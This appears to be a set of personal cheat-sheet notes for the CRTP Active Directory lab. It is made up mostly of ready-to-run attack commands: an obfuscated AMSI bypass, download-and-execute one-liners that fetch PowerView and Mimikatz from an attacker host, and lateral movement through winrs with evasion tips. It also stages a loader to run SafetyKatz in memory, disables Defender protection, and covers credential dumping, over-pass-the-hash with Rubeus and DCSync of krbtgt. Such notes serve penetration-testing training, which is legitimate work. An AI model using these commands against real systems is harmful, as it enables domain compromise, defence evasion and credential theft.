# CRTP
# CMD & PS 
```powershell
# Use Invishell
C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1')) 

# or use sbloggingbypass.txt + AMSI Bypass
iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
```

# Lateral Movement 
```powershell
One-To-One
#Avoid using psexec as it is too noisy. instead, to use "Enter-PSSession" you need Admin Privs
Enter-PSSession -ComputerName <dcorp-adminsrv>
#After getting the access run `whomai` to get the username, run `hostname` to get the pc name

Using Invoke-Command
Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt

#you can use winrs in place of PSRemoting to evade the logging (more stealthy)
winrs -r:dcorp-mgmt hostname;whoami  #run command to check whether we have access or not
winrs -r:dcorp-mgmt cmd  #get a cmd shell on mgmt machine
```
```powershell
One-To-Many
#Execute a Command
Invoke-Command -Scriptblock {ls env:} -ComputerName (Get-Content <list_of_servers>)
#Execute a Script
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

```powershell
#storing the session in a variable
$var = Enter-PSSession -ComputerName dcorp-admin

#Enter the session
Enter-PSSession -Session $var

#Interact with the target machine
Invoke-Command -Session $var -ScriptBlock {ls env:}
```

# Lateral Movement - Invoke-Mimikatz
```powershell
#After Abusing winrs
#Use SafetyKatz.exe to dump the hashes
#1- Host Loader.exe & Run the following command on the reverse shell
PS> iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe

#2- Now, copy the Loader.exe to dcorp-mgmt:
PS> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

#3- Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt: 
PS> $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

#4- Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt
PS> $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit


#After Abusing PowerShell Remoting
#1- Host Invoke-Mimi.ps1 & Run the following command on the reverse shell
iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)

#2- Disable AMSI & Dump the hashes
PS> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
PS> Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
PS> Invoke-Command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
```

```Powershell
Over-Pass-The-Hash  #for better offsec use AES keys than NTLM
# Using Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

# Using SafetyKatz
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

#Using Rubeus (Recommended)
#if you don't have elevated session use below
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt

#if you have elevated session use below
#1- Create a new process & inject the ticket init
C:\Windows\system32> C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

#2- Access the DC from the new process  #remember that this is logon type 9, means you will still have the same username in your CMD. However, if you use winrs to connect to the machine you will have the new creds
winrs -r:dcorp-dc cmd /c set username  #show the username
winrs -r:dcorp-dc cmd  #interactive CMD with new creds


DCSync
# Using MimiKatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

# Using SafetyKatz
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

# Derivative Local Admin
```powershell
Derivative means, if user A in machine A has local admin access on machine B & user B in machine B, has local admin access on machine C, this means user A has local admin access on machine C.
#1- Find machines on which you have local admin privilege.
PS> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS> Find-PSRemotingLocalAdminAccess

#2- App locker check
#if you attempted to use any script ex. AMSI bypass you will get "Cannot invoke method. Method invocation is supported on core type in this language mode" error
PS> $ExecutionContext.SessionState.LanguageMode  #Check language mode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections  #list app locker policy
```
![image](https://github.com/user-attachments/assets/a073bfb1-dd42-4dd1-829c-650b384c942a)

```powershell
1-  Rule No.1 Allow every user to run all scripts located in the program files folder
2-  Rule No.2 Allow every user to run all scripts located in the windows32 folder
```
